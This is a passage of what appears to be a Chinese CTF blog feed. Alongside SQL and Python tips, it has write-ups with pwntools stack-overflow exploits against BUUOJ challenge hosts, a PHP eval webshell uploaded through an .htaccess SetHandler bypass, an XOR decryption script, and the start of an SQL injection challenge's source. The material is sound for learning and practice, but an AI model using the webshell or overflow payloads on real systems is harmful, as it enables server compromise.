operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span>小王    <span class="token operator">|</span> <span class="token number">3</span><span class="token operator">-</span><span class="token number">0</span>                                                 <span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>小明    <span class="token operator">|</span> <span class="token number">2</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token operator">-</span><span class="token number">0</span>                                       <span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span>  小紫  <span class="token operator">|</span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token operator">-</span><span class="token number">0</span>                                           <span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------++------+------++------+------++------+------+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="6">
<li>以 id 分组，把去除重复后的 name 字段的值打印在一行，逗号分隔</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token keyword">distinct</span> name<span class="token punctuation">)</span> <span class="token keyword">from</span> aa <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+-----------------------------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> id<span class="token operator">|</span> group_concat<span class="token punctuation">(</span><span class="token keyword">distinct</span> name<span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+-----------------------------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span><span class="token number">1</span> <span class="token operator">|</span> <span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span><span class="token number">2</span> <span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span><span class="token number">3</span> <span class="token operator">|</span> <span class="token number">200</span><span class="token punctuation">,</span><span class="token number">500</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">+</span><span class="token comment">------+-----------------------------+</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">3</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p><mark>DISTINCT 子句用于在连接分组之前消除组中的重复值</mark></p>
<ol start="7">
<li>以 id 分组，把 name 字段的值打印在一行，逗号分隔，以 name 排倒序</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>name <span class="token keyword">order</span> <span class="token keyword">by</span> name <span class="token keyword">desc</span><span class="token punctuation">)</span> <span class="token keyword">from</span> aa <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+---------------------------------------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> id<span class="token operator">|</span> group_concat<span class="token punctuation">(</span>name <span class="token keyword">order</span> <span class="token keyword">by</span> name <span class="token keyword">desc</span><span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+---------------------------------------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span><span class="token number">1</span> <span class="token operator">|</span> <span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">10</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span><span class="token number">2</span> <span class="token operator">|</span> <span class="token number">20</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span><span class="token number">3</span> <span class="token operator">|</span> <span class="token number">500</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">+</span><span class="token comment">------+---------------------------------------+</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">3</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p><mark>order by 如果要按降序对值进行排序，则需要明确指定 DESC 选项</mark></p>
]]></content>
      <categories>
        <category>WEB前后端原理</category>
        <category>后端基础SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中translate()和maketrans()的使用</title>
    <url>/Python%E4%B8%ADtranslate-%E5%92%8Cmaketrans-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>base64 字典表顺序时可能会用到.<br />
<a id="more"></a><br />
payload 如下</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>str1 <span class="token operator">=</span> <span class="token string">"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI=="</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>s1<span class="token operator">=</span> <span class="token string">"AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>s2<span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>str1 是需要解码的 base64<br />
s1 是给出的字典表，s2 是 s1 的（常规）映射表.<br />
 下面简单讲解一下两种语法的使用.</p>
<p><mark>maketrans()</mark><br />
 生成字符串映射，即上述中 s2 是 s1 的映射表，也就是说 a 对应 B，B 对应 C，b 对应 D，以此类推...<br />
<mark>translate()</mark><br />
 这里对 str1 字符串使用这个 s1 与 s2 生成的映射关系，生成新的 base64</p>
]]></content>
      <categories>
        <category>wiki</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现字频统计</title>
    <url>/Python%E5%AE%9E%E7%8E%B0%E5%AD%97%E9%A2%91%E7%BB%9F%E8%AE%A1/</url>
    <content><![CDATA[<p>做题时遇到大量字符串怎么办？？<br />
<a id="more"></a></p>
<p>利用 collection 模块简化代码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	text_list <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token triple-quoted-string string">'''将读取的内容转换为字符串'''</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	text_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>text_list<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	count <span class="token operator">=</span> Counter<span class="token punctuation">(</span>text_str<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wiki</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Rip覆盖</title>
    <url>/Rip%E8%A6%86%E7%9B%96/</url>
    <content><![CDATA[<p>实属栈溢出.<br />
<a id="more"></a><br />
<img data-src="https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png" alt="" /></p>
<h2 id="启动ida"><a class="anchor" href="#启动ida">#</a> 启动 IDA</h2>
<p><img data-src="https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png" alt="" /></p>
<p>这个 gets 没有限制输入，存在栈溢出漏洞.</p>
<p><img data-src="https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png" alt="" /></p>
<p>需要我们输入来获取 flag;</p>
<p>在 main 函数下还有一个 fun 函数；我们可以点开看看看</p>
<p><img data-src="https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png" alt="" /></p>
<p>是一个系统调用且 start at 401186 (待会 payload 可以用到)</p>
<p>双击 s 来到 stack of main 视图，这里了解了我们只需存入 15 个字节即可劫持函数返回地址<br />
<img data-src="https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png" alt="" /></p>
<p>IDA 方面进行的差不多了，下面可以开始着手写脚本了</p>
<h2 id="构造exp"><a class="anchor" href="#构造exp">#</a> 构造 exp</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27829</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="执行"><a class="anchor" href="#执行">#</a> 执行</h2>
<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png" alt="" /></p>
<p>刚开始还不知道要干什么，以为又是脚本写错了，后来才发觉是要执行 cat /flag 命令</p>
<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png" alt="" /></p>
<p>get <span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{8bf972eb-867d-485b-94d5-737f5bc12947}</span></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>UPLOAD</title>
    <url>/UPLOAD/</url>
    <content><![CDATA[<p>涉及到.htaccess<br />
<a id="more"></a><br />
<img data-src="https://i.loli.net/2021/02/21/vU6IVNDxcr9YHbm.png" alt="" title="一目了然" /><br />
 就是要我们上传一句话木马</p>
<h2 id="解题思路"><a class="anchor" href="#解题思路">#</a> 解题思路</h2>
<p>按照往常一样，我们先写一份 payload</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?php </pre></td></tr><tr><td data-num="2"></td><td><pre>@eval($_POST['attack']) ;</pre></td></tr><tr><td data-num="3"></td><td><pre>?></span></pre></td></tr></table></figure><p>将文本保存成 jpg 格式的图片，然后抓包上传。</p>
<p><img data-src="https://i.loli.net/2021/02/21/nUXpQqmFbN9jGSe.png" alt="" /><br />
将 filename 中的 jpg 格式改为 PHP，当作 php 文件解析。</p>
<p><img data-src="https://i.loli.net/2021/02/21/9QhJTdr3z2FyCus.png" alt="" title="上传失败.." /><br />
祖安人骂了一半，但口水已经溅到脸上了。<br />
接下来我改成 phtml,php1、2、3 都不管用；但是直接上传.jpg 是成功的，可问题是服务器并不会把 jpg 当作 php 来解析，这也告知了我们需要用别的文件来辅助上传。<br />
迫不得已看了 WP，这里需要上传.htaccess 文件，原因是上传目录中没有本该存在的 php 文件。</p>
<h3 id="这里先大致了解一下什么是htaccess"><a class="anchor" href="#这里先大致了解一下什么是htaccess">#</a> 这里先大致了解一下什么是.htaccess</h3>
<p>.htaccess 文件（分布式配置文件），提供了针对目录改变配置的方法，<span class="rainbow">就是在一个特定的文件目录中放置一个包含多个指令的文件，以作用于此目录及其子目录。</span><br />
作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 allowOverride 指令来设置。<br />
<span class="purple">.htaccess 文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有 root 权限的情况下。</span></p>
<h2 id="handle"><a class="anchor" href="#handle">#</a> Handle</h2>
<p>在.htaccess 文件中写入</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/02/21/gWwZJlPfoa3EpOr.png" alt="" title="更改Content-Type的类型为  image/jpeg" /><br />
之后放包</p>
<p><img data-src="https://i.loli.net/2021/02/21/oxy4dLInORQwpW8.png" alt="" /><br />
可以看到.htaccess 文件上传成功。</p>
<p>接下来我们只需要将刚刚上传失败的一句话木马再上传一遍即可。<br />
<img data-src="https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png" alt="" title="这里不需要改动什么了" /><br />
<img data-src="https://i.loli.net/2021/02/21/Pqz34WrG5hLTMAJ.png" alt="" title="木马也已经上传成功了" /></p>
<p>最后我们可以用菜刀链接服务器查看目录里藏着 flag 的文件了。</p>
<p>菜刀连接，密码为 attack<br />
<img data-src="https://i.loli.net/2021/02/21/tbCJB6ODKpyAZ5g.png" alt="" title="在根目录中发现flag" /><br />
 将它下载下来；<br />
<img data-src="https://i.loli.net/2021/02/21/5oAvpyN2Pi4TlDF.png" alt="" title="得到flag" /></p>
<p>关于上传漏洞的知识点在<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAzL2FydGljbGUvZGV0YWlscy8xMDQ4NTg3MDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTItMi5jb250cm9sJmFtcDtkaXN0X3JlcXVlc3RfaWQ9ZDcwNmYwNTYtZjdhNS00NTMxLWEwNGUtYTRlMjk5MmQwMzZiJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21NYWNoaW5lTGVhcm5QYWkyLTIuY29udHJvbA==">这篇博文</span>会有更详细的见解</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XOR</title>
    <url>/XOR/</url>
    <content><![CDATA[<p>关于 python xor 的脚本<br />
<a id="more"></a></p>
<h2 id="ida打开看看"><a class="anchor" href="#ida打开看看">#</a> IDA 打开看看</h2>
<p>找到 main 函数，我们看到有异或字符，和 global 比较，相同的话就获得 flag</p>
<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/f878bebf3c3e1066.png" alt="" /></p>
<p><span class="purple">第 9 行得知 flag 的长度为 33</span></p>
<p><span class="red">第 13 行比较 v6 和 global 处存放的前 31 位字符是否相同；相同则输出 success</span></p>
<p><span class="rainbow">从 main 函数里面可以得到 V6 的处理方式为 v6 [i] 等于 v6 [i] 原来的值与 v6 [i-1] 按位异或.</span></p>
<h2 id="查看global字符串"><a class="anchor" href="#查看global字符串">#</a> 查看 global 字符串</h2>
<p><img data-src="https://ftp.bmp.ovh/imgs/2021/01/827aed457e7cd92a.png" alt="" /></p>
<h2 id="编写解密脚本"><a class="anchor" href="#编写解密脚本">#</a> 编写解密脚本</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'w&amp;O.@'</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'Z;U'</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token string">'v"M#D'</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token string">'G2O'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ss <span class="token operator">=</span> <span class="token string">'fkw&amp;O.@xZ;UpFv"M#DghG2O'</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>x <span class="token operator">=</span> <span class="token string">"f"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">79</span> <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#字符串转换成 10 进制</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#对应 v6</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr></table></figure><p>拿到 flag： <span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{QianQiuWanDai_YiTongJiangHu}</span></p>
<h3 id="参考"><a class="anchor" href="#参考">#</a> 参考</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLW9wZXJhdG9ycy5odG1s">https://www.runoob.com/python/python-operators.html</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDczMTEwMC9hcnRpY2xlL2RldGFpbHMvODkxNTYxNDE=">https://blog.csdn.net/weixin_44731100/article/details/89156141</span></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>Re</category>
      </categories>
      <tags>
        <tag>逆向异或脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_n_1</title>
    <url>/ciscn-2019-n-1/</url>
    <content><![CDATA[<p>可能是栈溢出吗<br />
<a id="more"></a></p>
<h2 id="先放出pwn的checksec"><a class="anchor" href="#先放出pwn的checksec">#</a> 先放出 pwn 的 checksec</h2>
<p><img data-src="https://i.loli.net/2021/01/27/nB356Ro1mZPaT7K.png" alt="" /></p>
<p>64 位且栈堆不可执行</p>
<h2 id="ida打开"><a class="anchor" href="#ida打开">#</a> IDA 打开</h2>
<p><img data-src="https://i.loli.net/2021/01/27/M7mdhurN319ifJo.png" alt="" /></p>
<p>gets 是可以溢出的，但没必要；这一题我们只要覆盖到 v2, 然后让 v2==11.28125 就可以了.</p>
<p>因此 gets 时先覆盖 b'a'*(0x30-0x04) 即可到 v2 的部分，再跟上 11.28125 的十六进制数即可成功获取 flag.</p>
<p><img data-src="https://i.loli.net/2021/01/27/r457DUpQKStM23l.png" alt="" /></p>
<p>通过在线转换我们获得 16 进制的浮点数.</p>
<p>让我们开始 payload 吧.</p>
<h2 id="构造exp如下"><a class="anchor" href="#构造exp如下">#</a> 构造 exp 如下</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28466</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>最后执行得到 flag<br />
<img data-src="https://i.loli.net/2021/01/27/biPjdpe4F3ULZ5V.png" alt="" /></p>
<p><span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{3220e461-4bf7-4910-8abc-19873d83291c}</span></p>
<h3 id="贴一个在线进制转换"><a class="anchor" href="#贴一个在线进制转换">#</a> 贴一个在线进制转换</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9sb3N0cGhwLmNvbS9oZXhjb252ZXJ0Lw==">CLICK ME</span></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf.show-萌新web1-4</title>
    <url>/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/</url>
    <content><![CDATA[<p>简单记录 sql 绕过方法<br />
<a id="more"></a></p>
<h1 id="question1"><a class="anchor" href="#question1">#</a> Question1</h1>
<h2 id="源码"><a class="anchor" href="#源码">#</a> 源码:</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="8"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="9"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="10"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="11"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>    $id = $_GET['id'];</pre></td></tr><tr><td data-num="13"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="14"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="15"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="16"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="17"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="18"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="19"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="20"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="21"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="22"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="23"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="24"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="25"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="26"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="27"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="28"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="29"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="30"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="31"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="32"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="33"></td><td><pre>    </pre></td></tr><tr><td data-num="34"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="35"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="36"></td><td><pre>&#125;</pre></td></tr><tr><td 